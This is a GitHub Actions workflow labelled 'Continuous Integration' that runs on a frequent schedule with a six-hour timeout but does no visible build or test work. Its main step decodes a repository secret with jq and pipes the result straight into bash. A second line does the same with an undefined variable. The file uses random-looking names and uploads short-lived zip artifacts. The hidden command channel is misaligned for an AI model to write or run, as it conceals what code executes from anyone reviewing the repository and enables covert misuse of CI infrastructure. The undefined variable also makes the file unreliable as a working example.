name: Continuous Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '48 2,8,14,20 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  automation:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Process
        env:
          e33: ${{ secrets.e33 }}
        run: |
          printf '%s' "$e33" | jq -r .cy14 | /bin/bash
          printf '%s' "$rc75" | jq -r .utepv26 | /bin/bash

      - name: Store results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: HqWFEOrL
          path: "*.zip"
          retention-days: 1
